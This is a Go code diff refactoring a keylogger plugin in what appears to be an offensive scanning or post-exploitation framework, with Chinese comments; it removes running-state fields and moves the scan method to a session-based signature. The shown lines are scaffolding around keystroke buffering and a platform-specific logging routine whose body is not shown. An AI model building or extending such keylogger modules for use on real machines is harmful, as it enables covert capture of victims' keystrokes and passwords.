@@ -23,8 +23,6 @@ import (
 // - 保持原有功能逻辑
 type KeyloggerPlugin struct {
 	plugins.BasePlugin
-	isRunning   bool
-	stopChan    chan struct{}
 	keyBuffer   []string
 	bufferMutex sync.RWMutex
 }
@@ -33,13 +31,13 @@ type KeyloggerPlugin struct {
 func NewKeyloggerPlugin() *KeyloggerPlugin {
 	return &KeyloggerPlugin{
 		BasePlugin: plugins.NewBasePlugin("keylogger"),
-		stopChan:   make(chan struct{}),
 		keyBuffer:  make([]string, 0),
 	}
 }
 
 // Scan 执行键盘记录 - 直接实现
-func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, config *common.Config, state *common.State) *plugins.Result {
+func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
+	config := session.Config
 	var output strings.Builder
 
 	// 从config获取配置
@@ -100,10 +98,6 @@ func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, confi
 
 // startKeylogging 启动键盘记录
 func (p *KeyloggerPlugin) startKeylogging(ctx context.Context, outputFile string) error {
-	p.isRunning = true
-	defer func() {
-		p.isRunning = false
-	}()
 
 	// 根据平台启动相应的键盘记录
 	var err error
